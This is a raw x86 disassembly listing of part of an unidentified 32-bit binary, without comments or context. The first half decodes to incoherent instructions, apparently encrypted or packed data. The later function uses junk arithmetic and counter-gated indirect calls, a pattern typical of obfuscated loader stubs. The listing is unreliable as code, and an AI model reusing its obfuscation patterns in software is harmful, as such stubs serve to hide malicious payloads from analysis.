  40bb12:	adc    edi,eax
  40bb14:	test   al,cl
  40bb16:	jb     0x40bb1a
  40bb18:	jae    0x40bb76
  40bb1a:	jle    0x40bb3a
  40bb1c:	je     0x40bb61
  40bb1e:	jbe    0x40bab7
  40bb20:	sub    eax,DWORD PTR [esi-0x484727a9]
  40bb26:	mov    edx,0xe82a9889
  40bb2b:	mov    ch,0x92
  40bb2d:	add    dh,BYTE PTR [esi+0x4d41c024]
  40bb33:	and    eax,0x412dc088
  40bb38:	jne    0x40bba3
  40bb3a:	test   DWORD PTR [ebx+0x11],ebx
  40bb3d:	mov    eax,0xf19cb39e
  40bb42:	out    dx,al
  40bb43:	hlt    
  40bb44:	mov    dh,0x1c
  40bb46:	or     eax,DWORD PTR [ecx+0x58]
  40bb49:	data16 adc al,0xeb
  40bb4c:	iret   
  40bb4d:	add    ebp,DWORD PTR [eax]
  40bb4f:	mov    ebp,0x7729c7b4
  40bb54:	fild   WORD PTR ds:[edi+0x7c5a8b17]
  40bb5b:	cmp    al,0xd1
  40bb5d:	push   esp
  40bb5e:	shl    BYTE PTR [ebp-0x69dd8ead],0xcb
  40bb65:	cmp    al,0x7e
  40bb67:	pop    edx
  40bb68:	std    
  40bb69:	push   ebp
  40bb6a:	pop    es
  40bb6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb6c:	and    dh,al
  40bb6e:	or     eax,0x52ddac3c
  40bb73:	cmp    DWORD PTR [edi+0x69],edi
  40bb76:	sub    dl,BYTE PTR [ebp+ebp*4-0x70]
  40bb7a:	pusha  
  40bb7b:	dec    ebx
  40bb7c:	aam    0x7d
  40bb7e:	and    BYTE PTR [esi-0x1629a60d],ah
  40bb84:	cwde   
  40bb85:	cmp    ebx,DWORD PTR [ebx-0x3b37a750]
  40bb8b:	xor    bl,BYTE PTR [ebx]
  40bb8d:	lock test cl,dl
  40bb90:	cs (bad) 
  40bb92:	(bad)  
  40bb93:	dec    ebp
  40bb94:	push   0xffffffdb
  40bb96:	stos   DWORD PTR es:[edi],eax
  40bb97:	mov    al,0xe4
  40bb99:	enter  0xcdff,0xc0
  40bb9d:	cmp    ebx,eax
  40bb9f:	hlt    
  40bba0:	(bad)  
  40bba1:	push   ecx
  40bba2:	gs mov ebx,0xf651d716
  40bba8:	js     0x40bb74
  40bbaa:	jo     0x40bb76
  40bbac:	test   eax,0x7ce86714
  40bbb1:	push   0x8d835d83
  40bbb6:	lods   al,BYTE PTR ds:[esi]
  40bbb7:	inc    edx
  40bbb8:	add    BYTE PTR [edi+ebp*4-0x5fe84199],bl
  40bbbf:	sbb    DWORD PTR [ebx-0x25170b3f],ebx
  40bbc5:	add    DWORD PTR [ebp-0x1ea138ed],edx
  40bbcb:	add    BYTE PTR [eax],0xa0
  40bbce:	pop    eax
  40bbcf:	lock or esi,0xffffff88
  40bbd3:	xor    ebp,eax
  40bbd5:	mov    ds:0x9faefd3f,al
  40bbda:	outs   dx,BYTE PTR ds:[esi]
  40bbdb:	adc    al,0xf
  40bbdd:	adc    DWORD PTR [edx],eax
  40bbdf:	adc    ah,BYTE PTR [ebx]
  40bbe1:	leave  
  40bbe2:	inc    edx
  40bbe3:	adc    edx,0x60cbb319
  40bbe9:	lock xchg ebp,eax
  40bbeb:	mov    BYTE PTR [esi-0xd70e2ce],ch
  40bbf1:	xchg   ecx,eax
  40bbf2:	adc    eax,esp
  40bbf4:	push   0xc5360279
  40bbf9:	lds    edi,FWORD PTR [edx]
  40bbfb:	lds    edx,FWORD PTR [ebx+0xb9b8393]
  40bc01:	das    
  40bc02:	call   0x5b49359c
  40bc07:	ins    DWORD PTR es:[edi],dx
  40bc08:	popf   
  40bc09:	scas   eax,DWORD PTR es:[edi]
  40bc0a:	sbb    ebp,DWORD PTR [edx]
  40bc0c:	leave  
  40bc0d:	mov    eax,ds
  40bc0f:	adc    eax,0x55fbd01d
  40bc14:	push   ss
  40bc15:	mov    bl,0x20
  40bc17:	test   BYTE PTR [ebx],ch
  40bc19:	inc    edi
  40bc1a:	mov    bl,0xc1
  40bc1c:	dec    esp
  40bc1d:	sbb    BYTE PTR ds:0xa3bd88ca,al
  40bc23:	xchg   edi,eax
  40bc24:	std    
  40bc25:	xor    al,0xa7
  40bc27:	jno    0x40bc51
  40bc29:	jo     0x40bc90
  40bc2b:	test   eax,0x34a54644
  40bc30:	clc    
  40bc31:	jmp    0x40bc47
  40bc33:	jbe    0x40bc69
  40bc35:	call   0x693c:0x4b2e43a0
  40bc3c:	sbb    al,0xdb
  40bc3e:	mov    BYTE PTR [eax],ch
  40bc40:	cs inc ebp
  40bc42:	dec    esp
  40bc43:	enter  0xfe6b,0x61
  40bc47:	or     BYTE PTR [ecx+eiz*4+0x42],ch
  40bc4b:	ins    BYTE PTR es:[edi],dx
  40bc4c:	pop    eax
  40bc4d:	mov    edx,0x3ee03d1d
  40bc52:	jmp    DWORD PTR [ebp+0x30e8f73e]
  40bc58:	rcr    DWORD PTR [ebp-0x3bd33828],0xfd
  40bc5f:	sub    al,0x94
  40bc61:	(bad)  
  40bc62:	mov    ebp,0x8ce2cba7
  40bc67:	sbb    ebx,DWORD PTR [edi+0x6fc83f2f]
  40bc6d:	callw  0xb2f5
  40bc71:	fsubr  st(4),st
  40bc73:	pop    ebp
  40bc74:	inc    ebp
  40bc75:	or     dh,bl
  40bc77:	push   bx
  40bc79:	cmp    eax,0x448ba748
  40bc7e:	aam    0x10
  40bc80:	cdq    
  40bc81:	adc    al,0x25
  40bc83:	shl    BYTE PTR [edi+0x17d806ac],cl
  40bc89:	add    eax,0xb32ec8b8
  40bc8e:	jl     0x40bc4c
  40bc90:	push   ecx
  40bc91:	cmp    edi,DWORD PTR [ebp+0x3a]
  40bc94:	jle    0x40bc77
  40bc96:	scas   eax,DWORD PTR es:[edi]
  40bc97:	daa    
  40bc98:	inc    ebp
  40bc99:	mov    ah,0x26
  40bc9b:	stos   DWORD PTR es:[edi],eax
  40bc9c:	into   
  40bc9d:	mov    ebp,0xe892ad9b
  40bca2:	lock dec ebp
  40bca4:	retf   0xd67e
  40bca7:	adc    al,0xc
  40bca9:	cmp    al,0x8c
  40bcab:	mov    ecx,0x1443f5f6
  40bcb0:	adc    esi,DWORD PTR [edx-0x78548051]
  40bcb6:	aas    
  40bcb7:	cmp    BYTE PTR [esi+0x749ca042],al
  40bcbd:	xchg   DWORD PTR [esi+0x6eab3131],ecx
  40bcc3:	add    bl,ch
  40bcc5:	jmp    FWORD PTR [edx+edx*1]
  40bcc8:	mov    eax,0xdbbaa785
  40bccd:	das    
  40bcce:	fwait
  40bccf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bcd0:	aas    
  40bcd1:	dec    ecx
  40bcd2:	adc    bh,al
  40bcd4:	inc    ebp
  40bcd5:	adc    edi,ebp
  40bcd7:	cli    
  40bcd8:	mov    esi,0x28ed2383
  40bcdd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bcde:	repnz sbb eax,0xc071dead
  40bce4:	pop    eax
  40bce5:	les    ecx,FWORD PTR [ebx-0x7e]
  40bce8:	dec    eax
  40bce9:	jp     0x40bc7e
  40bceb:	add    al,0x4f
  40bced:	pop    esp
  40bcee:	add    DWORD PTR [ecx],0xe53bc6f4
  40bcf4:	cmp    al,0xa8
  40bcf6:	cld    
  40bcf7:	adc    ch,ah
  40bcf9:	icebp  
  40bcfa:	fld    QWORD PTR ss:[ebx]
  40bcfd:	adc    ebx,esi
  40bcff:	or     al,BYTE PTR [edx+edx*1+0x5c51cf22]
  40bd06:	aas    
  40bd07:	xchg   ecx,edx
  40bd09:	scas   al,BYTE PTR es:[edi]
  40bd0a:	jmp    0x5990:0x6f402fe7
  40bd11:	add    al,0x97
  40bd13:	sub    BYTE PTR [esi-0x58ce0b02],al
  40bd19:	(bad)  
  40bd1a:	pop    ecx
  40bd1b:	add    al,0x29
  40bd1d:	pop    ebp
  40bd1e:	mov    ?,WORD PTR [eax+0x79349928]
  40bd24:	sbb    eax,0xeb20959a
  40bd29:	or     al,0xdf
  40bd2b:	pop    DWORD PTR [edi]
  40bd2d:	sbb    esi,DWORD PTR [esp+edi*4-0x32]
  40bd31:	(bad)  
  40bd32:	jmp    0xb6:0x79aad1c7
  40bd39:	and    edx,DWORD PTR [eax+0x2a9697c8]
  40bd3f:	cmp    DWORD PTR [eax-0x2e],edi
  40bd42:	jp     0x40bd05
  40bd44:	sub    ch,BYTE PTR [ebp-0x5a]
  40bd47:	rcr    BYTE PTR [eax+0x3b],cl
  40bd4a:	pop    esp
  40bd4b:	ret    0x616c
  40bd4e:	sbb    al,0x8b
  40bd50:	or     DWORD PTR [ecx+0x31ce908],ecx
  40bd56:	add    BYTE PTR [eax],al
  40bd58:	out    0x4c,al
  40bd5a:	xor    al,0x30
  40bd5c:	mov    ah,0x70
  40bd5e:	loop   0x40bda8
  40bd60:	into   
  40bd61:	xor    BYTE PTR [ecx],bl
  40bd63:	xchg   esp,eax
  40bd64:	jnp    0x40bd38
  40bd66:	es jo  0x40bd85
  40bd69:	cmp    BYTE PTR [esi+0x7e],0x7a
  40bd6d:	jge    0x40bded
  40bd6f:	jle    0x40bd44
  40bd71:	repnz stos BYTE PTR es:[edi],al
  40bd73:	jnp    0x40bda1
  40bd75:	fiadd  WORD PTR [ecx+0x2c]
  40bd78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd79:	iret   
  40bd7a:	pop    ecx
  40bd7b:	dec    esi
  40bd7c:	je     0x40bd52
  40bd7e:	jo     0x40bd46
  40bd80:	imul   ebx,DWORD PTR [eax],0x584da52c
  40bd86:	outs   dx,BYTE PTR ds:[esi]
  40bd87:	out    0x60,eax
  40bd89:	cmp    BYTE PTR [edi],0xdf
  40bd8c:	pop    es
  40bd8d:	enter  0xfcd0,0x30
  40bd91:	push   cs
  40bd92:	retf   
  40bd93:	enter  0x49b1,0xfe
  40bd97:	jo     0x40bd22
  40bd99:	aaa    
  40bd9a:	daa    
  40bd9b:	and    ebp,DWORD PTR [esi]
  40bd9d:	loop   0x40bd42
  40bd9f:	adc    DWORD PTR [eax],0x30
  40bda2:	pop    esi
  40bda3:	mov    BYTE PTR [ecx+0x5f],dh
  40bda6:	or     dh,ah
  40bda8:	add    eax,0x3bbe4109
  40bdae:	mov    esi,DWORD PTR [edi+0x66c86bac]
  40bdb4:	into   
  40bdb5:	sub    edx,DWORD PTR [esi+esi*4-0x10198ad9]
  40bdbc:	pop    ss
  40bdbd:	dec    eax
  40bdbe:	mov    WORD PTR [esi-0x11],fs
  40bdc1:	adc    DWORD PTR [edi-0x75],edi
  40bdc4:	retf   0xf111
  40bdc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bdc8:	fimul  DWORD PTR [esi+0x58]
  40bdcb:	repz mov ds,eax
  40bdce:	out    0x22,eax
  40bdd0:	shl    edx,1
  40bdd2:	jae    0x40be41
  40bdd4:	mov    bh,0xbd
  40bdd6:	jno    0x40be18
  40bdd8:	mov    edi,0x2d287f8b
  40bddd:	loopne 0x40bdc6
  40bddf:	sub    eax,0x4549d5d2
  40bde4:	mov    BYTE PTR [ecx+eax*2+0x7b775068],al
  40bdeb:	out    dx,al
  40bdec:	cmp    esi,DWORD PTR [ecx-0x5f082be8]
  40bdf2:	cli    
  40bdf3:	sbb    eax,0x95b96f76
  40bdf8:	cmp    al,0xdd
  40bdfa:	scas   eax,DWORD PTR es:[edi]
  40bdfb:	xor    ecx,DWORD PTR [esi+0x5d]
  40bdfe:	clc    
  40bdff:	adc    al,0xc3
  40be01:	mov    bl,0xa4
  40be03:	mov    BYTE PTR [edi],bl
  40be05:	push   0xc6d5a07c
  40be0a:	call   0xb1bdafff
  40be0f:	mov    ds:0x4d2750ae,al
  40be14:	outs   dx,BYTE PTR ds:[esi]
  40be15:	fisub  WORD PTR [ecx]
  40be17:	das    
  40be18:	xor    BYTE PTR [esi-0x4a7af2f7],ch
  40be1e:	nop
  40be1f:	mov    fs,WORD PTR [edx-0xe225d2a]
  40be25:	fisubr WORD PTR [eax+0x64]
  40be28:	in     eax,dx
  40be29:	addr16 jbe 0x40be0e
  40be2c:	fmul   DWORD PTR [edx]
  40be2e:	out    0xff,al
  40be30:	push   ds
  40be31:	xchg   DWORD PTR [edi+edx*8+0x5],edx
  40be35:	call   0x8a42:0x85c29fc2
  40be3c:	in     eax,dx
  40be3d:	das    
  40be3e:	ds enter 0xbb29,0xea
  40be43:	add    DWORD PTR [ebx+0x54],edx
  40be46:	bound  esi,QWORD PTR [ecx+ebx*2]
  40be49:	or     bl,BYTE PTR [edi]
  40be4b:	fcom   QWORD PTR [edi-0x48532cb8]
  40be51:	out    dx,eax
  40be52:	dec    edi
  40be53:	div    esp
  40be55:	mov    ds:0xe78ad881,eax
  40be5a:	or     eax,0x1a6d92e
  40be5f:	lds    edi,FWORD PTR [edx-0x1428740b]
  40be65:	mov    ebx,DWORD PTR [ebx]
  40be67:	push   es
  40be68:	fisubr WORD PTR [ebx]
  40be6a:	leave  
  40be6b:	mov    cl,bh
  40be6d:	inc    ebp
  40be6e:	bound  esi,QWORD PTR ds:0xf4e89ef1
  40be74:	popa   
  40be75:	fiadd  DWORD PTR [edx]
  40be77:	mov    ecx,esp
  40be79:	mov    ah,0xb8
  40be7b:	and    al,0xf2
  40be7d:	push   esi
  40be7e:	and    esi,DWORD PTR [edi-0x68]
  40be81:	inc    esp
  40be82:	adc    al,0xe9
  40be84:	xor    DWORD PTR [esp+edx*8],ebp
  40be87:	mov    eax,DWORD PTR [edx+0x6f274d40]
  40be8d:	outs   dx,BYTE PTR ds:[esi]
  40be8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be8f:	mov    ecx,0x69c84df7
  40be94:	int3   
  40be95:	rcr    cl,cl
  40be97:	fdiv   st(3),st
  40be9a:	fistp  QWORD PTR [esi-0x178be608]
  40bea0:	sub    al,0x79
  40bea2:	loop   0x40be3a
  40bea4:	repz sti 
  40bea6:	and    eax,0x745ab360
  40beab:	(bad)  
  40beac:	xchg   edi,eax
  40bead:	dec    ebx
  40beae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40beaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40beb0:	cli    
  40beb1:	fnstcw WORD PTR [edi-0xc142a53]
  40beb7:	mov    cl,0x0
  40beb9:	jno    0x40bedc
  40bebb:	mov    edx,0x65dc03e6
  40bec0:	inc    eax
  40bec1:	jp     0x40bed9
  40bec3:	jbe    0x40bec9
  40bec5:	ret    0xde04
  40bec8:	push   ecx
  40bec9:	mov    eax,0xf624b8fe
  40bece:	mov    ds:0x6f584e70,al
  40bed3:	mov    ebx,0x35425ce1
  40bed8:	dec    edx
  40bed9:	lock mov ah,al
  40bedc:	fdiv   st,st(3)
  40bede:	daa    
  40bedf:	lea    esi,gs:[esi-0x1852d885]
  40bee6:	fadd   DWORD PTR [eax-0x79]
  40bee9:	mov    ah,0xae
  40beeb:	aad    0x4c
  40beed:	stos   DWORD PTR es:[edi],eax
  40beee:	push   ss
  40beef:	repz mov edx,0x6014b2b8
  40bef5:	xchg   esi,eax
  40bef6:	leave  
  40bef7:	cmp    al,0x22
  40bef9:	repz shr DWORD PTR [edx-0x71],1
  40befd:	cwde   
  40befe:	cmp    al,0x91
  40bf00:	adc    bl,BYTE PTR [eax-0x13]
  40bf03:	mov    bl,0xa6
  40bf05:	xor    BYTE PTR [eax],dh
  40bf07:	dec    edx
  40bf08:	pop    es
  40bf09:	or     esp,DWORD PTR [edi]
  40bf0b:	jge    0x40bef9
  40bf0d:	outs   dx,DWORD PTR ds:[esi]
  40bf0e:	pop    esi
  40bf0f:	scas   al,BYTE PTR es:[edi]
  40bf10:	fnsave [edx+0x2aaa9c0a]
  40bf16:	loope  0x40bf54
  40bf18:	clc    
  40bf19:	cwde   
  40bf1a:	xor    ebx,DWORD PTR [eax]
  40bf1c:	jns    0x40bf2a
  40bf1e:	test   DWORD PTR [ebx+0x59a17918],ebp
  40bf24:	popf   
  40bf25:	(bad)
  40bf29:	fist   WORD PTR [edi-0xc16ade]
  40bf2f:	(bad)  
  40bf30:	mov    ecx,0xebe1b21d
  40bf35:	sbb    BYTE PTR [edi-0x56],cl
  40bf38:	and    eax,0x4875593c
  40bf3d:	push   edx
  40bf3e:	dec    edx
  40bf3f:	push   edi
  40bf40:	xchg   edx,eax
  40bf41:	mov    ecx,0x6bc02c6a
  40bf46:	inc    ebx
  40bf47:	imul   ebp,DWORD PTR [eax-0x2db6152b],0x2591d4e5
  40bf51:	sbb    DWORD PTR [ecx+0x62],ecx
  40bf54:	retf   
  40bf55:	sub    eax,edx
  40bf57:	leave  
  40bf58:	sbb    edx,DWORD PTR [eax-0x48]
  40bf5b:	sub    esp,DWORD PTR gs:[edi-0x76aa323]
  40bf62:	(bad)  
  40bf63:	jg     0x40bfd7
  40bf65:	dec    edx
  40bf66:	rcl    bl,1
  40bf68:	sub    edx,DWORD PTR [edx-0x7564599e]
  40bf6e:	pop    esp
  40bf6f:	fisubr DWORD PTR [ebp+0x224707da]
  40bf75:	ds pop ds
  40bf77:	lods   al,BYTE PTR ds:[esi]
  40bf78:	push   DWORD PTR [ebp-0x2c6309]
  40bf7e:	in     al,dx
  40bf7f:	popf   
  40bf80:	aad    0x1c
  40bf82:	sub    ebp,ecx
  40bf84:	loopne 0x40bf46
  40bf86:	inc    edi
  40bf87:	cmp    DWORD PTR [ebp-0x30be02e7],ebp
  40bf8d:	xor    DWORD PTR [edx-0x45],esi
  40bf90:	sar    BYTE PTR [esi+eiz*2+0x61],cl
  40bf94:	mov    edx,0x3e69ef0a
  40bf99:	ss mov ch,0x75
  40bf9c:	mov    ebx,0x5c8c23e4
  40bfa1:	js     0x40bff0
  40bfa3:	shl    esp,cl
  40bfa5:	add    ebp,0x854b8ca3
  40bfab:	pop    ebx
  40bfac:	mov    ah,0xd2
  40bfae:	pop    edx
  40bfaf:	mov    esp,0xf97915cf
  40bfb4:	mov    ecx,0x97a4c4ab
  40bfb9:	push   edx
  40bfba:	fldenv [ecx+0x790909fe]
  40bfc0:	je     0x40bf50
  40bfc2:	dec    ebx
  40bfc3:	arpl   WORD PTR [ebx-0x60f96af4],sp
  40bfc9:	dec    BYTE PTR [esi-0x7a]
  40bfcc:	fcmovnu st,st(7)
  40bfce:	sbb    edx,ebx
  40bfd0:	retf   
  40bfd1:	sub    BYTE PTR ds:0xeeee863e,cl
  40bfd7:	jmp    0x65fe8190
  40bfdc:	pop    esi
  40bfdd:	jmp    0x657e7b6a
  40bfe2:	jle    0x40bf98
  40bfe4:	xchg   ecx,eax
  40bfe5:	arpl   WORD PTR [ebp-0x4adbffeb],bp
  40bfeb:	jmp    0xd50e:0xa5da2fe6
  40bff2:	ins    DWORD PTR es:[edi],dx
  40bff3:	inc    ebx
  40bff4:	push   edx
  40bff5:	ja     0x40c00e
  40bff7:	sahf   
  40bff8:	dec    esp
  40bff9:	aad    0x53
  40bffb:	movaps XMMWORD PTR ss:[esi-0x63],xmm7
  40c000:	out    0x95,al
  40c002:	mov    al,0x2f
  40c004:	aaa    
  40c005:	stos   BYTE PTR es:[edi],al
  40c006:	mov    ch,BYTE PTR [ebx+0x9]
  40c009:	add    bl,BYTE PTR [ecx+eiz*8-0x5b26bc0f]
  40c010:	cs stos BYTE PTR es:[edi],al
  40c012:	mov    eax,0x34cb074b
  40c017:	pushf  
  40c018:	mul    DWORD PTR [eax]
  40c01a:	xchg   DWORD PTR [ebx],esp
  40c01c:	or     BYTE PTR [ebp+eiz*8-0x5f],ch
  40c020:	addr16 (bad) 
  40c022:	xchg   edi,eax
  40c023:	xchg   ebx,eax
  40c024:	test   al,al
  40c026:	push   0x7603b92e
  40c02b:	not    bl
  40c02d:	add    ah,ah
  40c02f:	jle    0x40c081
  40c031:	sbb    ebp,DWORD PTR [edi-0x26]
  40c034:	inc    eax
  40c035:	sti    
  40c036:	push   cs
  40c037:	xor    BYTE PTR [ebp+0x6c4c1a62],cl
  40c03d:	lea    esp,[ebx+edx*1+0x2302d689]
  40c044:	stos   BYTE PTR es:[edi],al
  40c045:	out    0xe2,eax
  40c047:	pop    ecx
  40c048:	mov    eax,0x665700f0
  40c04d:	or     cl,BYTE PTR [edi-0x4f50ffa3]
  40c053:	sbb    al,0x86
  40c055:	mov    dl,0x14
  40c057:	pop    es
  40c058:	ja     0x40c030
  40c05a:	out    0xeb,al
  40c05c:	push   edx
  40c05d:	in     al,dx
  40c05e:	pop    ebp
  40c05f:	fbstp  TBYTE PTR [edx-0x7f2e9b98]
  40c065:	adc    eax,0x5c69bf93
  40c06a:	sub    BYTE PTR [esi],al
  40c06c:	(bad)  [edx+0x5]
  40c06f:	jmp    0x40c080
  40c071:	jno    0x40c02c
  40c073:	out    0x8b,al
  40c075:	inc    ebp
  40c076:	or     al,0x8b
  40c078:	inc    ebp
  40c079:	or     bh,bh
  40c07b:	jne    0x40c075
  40c07d:	call   0x40746a
  40c082:	mov    eax,DWORD PTR [ebp-0xc]
  40c085:	cmp    eax,ebx
  40c087:	je     0x4098f8
  40c08d:	mov    eax,DWORD PTR [ebp-0x8]
  40c090:	mov    eax,DWORD PTR [eax]
  40c092:	pop    edi
  40c093:	pop    esi
  40c094:	pop    ebx
  40c095:	leave  
  40c096:	ret    0xc
  40c099:	push   ebp
  40c09a:	mov    ebp,esp
  40c09c:	sub    esp,0x30
  40c09f:	adc    DWORD PTR ds:0x433717,ecx
  40c0a5:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40c0ac:	xor    ecx,ecx
  40c0ae:	or     ecx,DWORD PTR ds:0x433727
  40c0b4:	and    DWORD PTR ds:0x433783,ecx
  40c0ba:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  40c0c1:	mov    ecx,DWORD PTR [ebp-0x4]
  40c0c4:	mov    DWORD PTR ds:0x4337b7,0x13
  40c0ce:	cmp    DWORD PTR ds:0x4337b7,0x0
  40c0d5:	je     0x40c103
  40c0db:	cmp    DWORD PTR ds:0x4337b7,0x1a
  40c0e2:	jne    0x40c0f3
  40c0e8:	push   0x1b76
  40c0ed:	call   DWORD PTR ds:0x412020
  40c0f3:	mov    eax,ds:0x4337b7
  40c0f8:	dec    eax
  40c0f9:	mov    ds:0x4337b7,eax
  40c0fe:	jmp    0x40c0ce
  40c103:	push   ebx
  40c104:	mov    DWORD PTR ds:0x4337e7,0x19
  40c10e:	cmp    DWORD PTR ds:0x4337e7,0x0
  40c115:	je     0x40c1bf
  40c11b:	cmp    DWORD PTR ds:0x4337e7,0xa
  40c122:	jne    0x40c133
  40c128:	push   0x4904
  40c12d:	call   DWORD PTR ds:0x412024
  40c133:	cmp    DWORD PTR ds:0x4337e7,0xb
  40c13a:	jne    0x40c14d
  40c140:	mov    ebx,DWORD PTR ds:0x4337e7
  40c146:	dec    ebx
  40c147:	mov    DWORD PTR ds:0x4337e7,ebx
  40c14d:	mov    ebx,DWORD PTR ds:0x4337e7
  40c153:	dec    ebx
  40c154:	mov    DWORD PTR ds:0x4337e7,ebx
  40c15a:	jmp    0x40c10e
  40c15f:	mov    DWORD PTR ds:0x433783,0x1d
  40c169:	cmp    DWORD PTR ds:0x433783,0x0
  40c170:	je     0x40c1bf
  40c176:	cmp    DWORD PTR ds:0x433783,0x3
  40c17d:	jne    0x40c193
  40c183:	push   0x433880
  40c188:	push   0x400000
  40c18d:	call   DWORD PTR ds:0x412028
  40c193:	cmp    DWORD PTR ds:0x433783,0x4
  40c19a:	jne    0x40c1ad
  40c1a0:	mov    ebx,DWORD PTR ds:0x433783
  40c1a6:	dec    ebx
  40c1a7:	mov    DWORD PTR ds:0x433783,ebx
  40c1ad:	mov    ebx,DWORD PTR ds:0x433783
  40c1b3:	dec    ebx
  40c1b4:	mov    DWORD PTR ds:0x433783,ebx
  40c1ba:	jmp    0x40c169
  40c1bf:	mov    eax,0x7510854
  40c1c4:	adc    ebx,DWORD PTR ds:0x4337ab
  40c1ca:	xor    ecx,eax
  40c1cc:	mov    ebx,0x32729b
  40c1d1:	add    ecx,ebx
  40c1d3:	mov    DWORD PTR [ebp-0x1c],ecx
  40c1d6:	movzx  ecx,BYTE PTR ds:0x4337b7
  40c1dd:	xor    DWORD PTR ds:0x433713,ecx
  40c1e3:	mov    ecx,DWORD PTR [ebp+0x14]
  40c1e6:	or     DWORD PTR ds:0x43371b,0x43377b
  40c1f0:	push   esi
  40c1f1:	push   edi
  40c1f2:	test   ecx,ecx
  40c1f4:	mov    DWORD PTR ds:0x43372b,0x6070
  40c1fe:	je     0x40c2fb
  40c204:	mov    ecx,DWORD PTR [ebp+0x14]
  40c207:	mov    DWORD PTR ds:0x4337a7,0x1d
  40c211:	cmp    DWORD PTR ds:0x4337a7,0x0
  40c218:	je     0x40c2a6
  40c21e:	cmp    DWORD PTR ds:0x4337a7,0x29
  40c225:	jne    0x40c23a
  40c22b:	push   DWORD PTR [ebp-0xc]
  40c22e:	push   DWORD PTR [ebp-0x1c]
  40c231:	push   DWORD PTR [ebp-0x20]
  40c234:	call   DWORD PTR ds:0x41202c
  40c23a:	xor    esi,esi
  40c23c:	or     esi,DWORD PTR ds:0x4337a7
  40c242:	dec    esi
  40c243:	mov    DWORD PTR ds:0x4337a7,esi
  40c249:	jmp    0x40c211
  40c24e:	mov    DWORD PTR ds:0x4337eb,0x10
  40c258:	cmp    DWORD PTR ds:0x4337eb,0x0
  40c25f:	je     0x40c2a6
  40c265:	cmp    DWORD PTR ds:0x4337eb,0x2
  40c26c:	jne    0x40c278
  40c272:	call   DWORD PTR ds:0x4121d8
  40c278:	cmp    DWORD PTR ds:0x4337eb,0x3
  40c27f:	jne    0x40c292
  40c285:	mov    esi,DWORD PTR ds:0x4337eb
  40c28b:	dec    esi
  40c28c:	mov    DWORD PTR ds:0x4337eb,esi
  40c292:	mov    esi,DWORD PTR ds:0x4337eb
  40c298:	dec    esi
  40c299:	mov    DWORD PTR ds:0x4337eb,esi
  40c29f:	jmp    0x40c258
  40c2a4:	and    esi,edi
  40c2a6:	mov    ecx,DWORD PTR [ecx]
  40c2a8:	and    DWORD PTR ds:0x433733,0x0
  40c2b2:	jmp    0x40c2c4
  40c2b7:	mov    esi,DWORD PTR ds:0x433733
  40c2bd:	inc    esi
  40c2be:	mov    DWORD PTR ds:0x433733,esi
  40c2c4:	cmp    DWORD PTR ds:0x433733,0x15
  40c2cb:	jae    0x40c2f8
  40c2d1:	cmp    DWORD PTR ds:0x433733,0x1e
  40c2d8:	jne    0x40c2ed
  40c2de:	push   DWORD PTR [ebp-0xc]
  40c2e1:	push   DWORD PTR [ebp-0x1c]
  40c2e4:	push   DWORD PTR [ebp-0x18]
  40c2e7:	call   DWORD PTR ds:0x4123a4
  40c2ed:	jmp    0x40c2b7
  40c2f2:	sbb    DWORD PTR ds:0x4337f3,edx
  40c2f8:	mov    DWORD PTR [ebp-0x1c],ecx
  40c2fb:	mov    ecx,DWORD PTR ds:0x4337eb
  40c301:	adc    DWORD PTR ds:0x4337fb,ecx
  40c307:	imul   edx,eax
  40c30a:	mov    esi,DWORD PTR ds:0x43374b
  40c310:	xor    ecx,ecx
  40c312:	or     ecx,DWORD PTR ds:0x433787
  40c318:	sub    esi,ecx
  40c31a:	or     esi,DWORD PTR [esi+ecx*1]
  40c31d:	mov    ecx,0x4573
  40c322:	mov    esi,DWORD PTR ds:0x4337e3
  40c328:	mov    esi,DWORD PTR [esi]
  40c32a:	sub    DWORD PTR ds:0x43372f,esi
  40c330:	add    edx,ecx
  40c332:	mov    esi,0x7879
  40c337:	and    DWORD PTR ds:0x4337a7,edi
  40c33d:	mov    edi,0x1556
  40c342:	sbb    DWORD PTR ds:0x433733,0x433767
  40c34c:	xchg   esi,ecx
  40c34e:	and    DWORD PTR ds:0x4337ff,0x0
  40c358:	xor    ecx,ecx
  40c35a:	add    ecx,DWORD PTR ds:0x4337ff
  40c360:	inc    ecx
  40c361:	mov    DWORD PTR ds:0x4337ff,ecx
  40c367:	cmp    DWORD PTR ds:0x4337ff,0xf
  40c36e:	jne    0x40c37f
  40c374:	push   0x8dd2
  40c379:	call   DWORD PTR ds:0x4121dc
  40c37f:	cmp    DWORD PTR ds:0x4337ff,0xe
  40c386:	jne    0x40c399
  40c38c:	mov    ecx,DWORD PTR ds:0x4337ff
  40c392:	inc    ecx
  40c393:	mov    DWORD PTR ds:0x4337ff,ecx
  40c399:	cmp    DWORD PTR ds:0x4337ff,0x1d
  40c3a0:	jb     0x40c358
  40c3a6:	neg    ecx
  40c3a8:	sub    edx,edi
  40c3aa:	adc    ecx,DWORD PTR ds:0x43376b
  40c3b0:	xor    esi,esi
  40c3b2:	add    DWORD PTR ds:0x4337ab,0x7522
  40c3bc:	mov    DWORD PTR [ebp-0x28],esi
  40c3bf:	xor    ecx,0x6487
  40c3c5:	mov    DWORD PTR [ebp-0x2c],esi
  40c3c8:	or     DWORD PTR ds:0x4337ab,ecx
  40c3ce:	mov    DWORD PTR [ebp-0x14],esi
  40c3d1:	mov    DWORD PTR [ebp-0x8],esi
  40c3d4:	mov    ecx,DWORD PTR [ebp-0x18]
  40c3d7:	add    DWORD PTR ds:0x43382b,0x43383b
  40c3e1:	xor    ecx,eax
  40c3e3:	and    DWORD PTR ds:0x4337af,0x4337bf
  40c3ed:	xor    edi,edi
  40c3ef:	xor    DWORD PTR ds:0x4337c3,ebx
  40c3f5:	add    ecx,ebx
  40c3f7:	mov    DWORD PTR ds:0x433737,0x6c1e
  40c401:	mov    DWORD PTR [ebp-0x20],ecx
  40c404:	mov    DWORD PTR ds:0x43372b,edi
  40c40a:	mov    eax,DWORD PTR [ebp-0x20]
  40c40d:	je     0x40cc0f
